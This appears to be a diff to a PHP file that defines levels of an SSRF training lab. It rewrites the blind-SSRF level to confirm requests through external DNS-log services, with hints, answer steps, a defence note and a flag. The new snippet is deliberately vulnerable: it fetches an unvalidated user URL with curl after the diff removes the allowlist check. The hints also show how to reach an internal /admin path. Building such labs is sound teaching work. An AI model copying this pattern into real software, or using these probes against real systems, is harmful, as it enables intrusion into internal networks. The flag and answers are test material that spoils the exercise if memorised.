@@ -327,50 +327,50 @@ PHP,
         12 => [
             'id' => 12,
             'key' => 'blind',
-            'title' => '盲 SSRF 回调',
+            'title' => '无回显 SSRF 验证',
             'difficulty' => '进阶',
-            'summary' => '业务不返回目标响应，但攻击者仍能通过外部回调确认请求已发出。',
-            'concept' => 'SSRF 不要求读取响应。只要能观察到 DNS 查询、HTTP 回调或响应时间变化，就能确认服务端请求存在并被利用。',
-            'goal' => '让报表导出服务访问回调监听器，并在靶场中确认盲请求记录。',
-            'targetLabel' => '回调监听 :8084',
-            'target' => 'http://127.0.0.1:8084/callback?token=blind-level12',
-            'codeLabel' => 'ReportExportController.php / BlindCallbackService.php',
+            'summary' => '把验证端点 /index?host= 的 host 参数设为 dnslog 子域名；如果 dnslog 收到解析请求，说明存在无回显 SSRF。',
+            'concept' => '无回显 SSRF 不要求响应带回数据；DNS 查询、回调请求或时间差都可以作为观察信道。验证端点的 host 参数会触发一次真实 DNS 查询。',
+            'goal' => '让验证端点解析你提供的 dnslog 子域名，并在 dnslog 平台确认记录。',
+            'targetLabel' => '验证端点 10.220.2.6:8080',
+            'target' => 'http://10.220.2.6:8080/index?host=your-subdomain.dnslog.cn',
+            'codeLabel' => 'BlindSsrfCheck.php / DnslogProbe.php',
             'snippet' => <<<'PHP'
 <?php
 /*
- * 学习目标：没有回显也可能存在 SSRF。
- * 回调服务、DNS 查询和响应时间都可以作为观察信道。
+ * 学习目标：无回显 SSRF 用外部 DNS 平台确认。
+ * 验证端点：http://10.220.2.6:8080/index?host=<dnslog>
  */
-// 业务场景：导出报表时通知外部任务系统
-$callbackUrl = (string) $request->input('callback_url');
+// POST /reports/export
+// 业务场景：无回显 SSRF 验证
+$url = trim((string) ($input['callback_url'] ?? ''));
 
-if (!str_starts_with($callbackUrl, 'http://127.0.0.1:8084/callback')) {
-    return response()->json(['error' => 'Invalid callback'], 422);
-}
-
-// 盲请求：业务不返回目标响应，但连接和请求仍然发生。
-$client = new AsyncHttpClient();
-$client->get($callbackUrl, [
-    'timeout' => 3,
-    'return_body' => false,
+// 服务端真实请求验证端点，但不把目标响应回显给调用方。
+$ch = curl_init($url);
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => false,
+    CURLOPT_TIMEOUT        => 4,
+    CURLOPT_PROXY          => '',
 ]);
+curl_exec($ch);
+curl_close($ch);
 
-return response()->noContent();
-
-// 回调服务仍然记录了：
-// token=blind-level12
-// remote=127.0.0.1
+// 验证端点会对 host 参数发起真实 DNS 查询。
+// 在 dnslog 平台看到解析记录，即可确认无回显 SSRF。
+// 也可以模拟目标访问内部网络：
+// http://10.220.2.6:8080/index?host=ssrf-lab&port=8081&path=/admin
 PHP,
-            'filter' => '回调地址限制：只允许 127.0.0.1:8084/callback。',
+            'filter' => '目标校验：请求 /index?host=，由验证端点发起 DNS 查询。',
             'hints' => [
-                '业务不返回目标正文，但服务端仍然发出了请求。',
-                '靶场的回调监听器会记录 token。',
-                '提交：http://127.0.0.1:8084/callback?token=blind-level12',
+                '验证端点的 /index?host= 会对 host 参数做真实 DNS 查询。',
+                '去 ceye.io 或 dnslog.cn 申请一个唯一子域名。',
+                '提交：http://10.220.2.6:8080/index?host=<你的 dnslog 子域名>',
+                '想模拟目标访问内网：把 URL 换成 http://10.220.2.6:8080/index?host=ssrf-lab&port=8081&path=/admin。',
             ],
             'answerSteps' => [
-                '提交允许范围内的回调 URL。',
-                '业务异步请求回调服务但不回显目标正文。',
-                '靶场通过回调记录确认盲 SSRF 已成功触发。',
+                '准备一个 dnslog 子域名。',
+                '把 host 参数设置为该子域名，提交验证 URL。',
+                '在 dnslog 平台看到解析记录，说明存在无回显 SSRF。',
             ],
             'defense' => '对盲 SSRF 使用独立出站代理和网络策略，记录完整目标；监控 DNS、回调域名和异常连接时间，不能只依赖响应内容判断风险。',
             'cause' => [
@@ -383,7 +383,7 @@ PHP,
                 ],
                 'keyGap' => '安全策略仍然依赖响应回显来识别风险，没有对出站连接本身做限制和审计。',
             ],
-            'successFlag' => 'FLAG{SSRF_BLIND_CALLBACK}',
+            'successFlag' => 'FLAG{SSRF_BLIND_DNS}',
         ],
         13 => [
             'id' => 13,
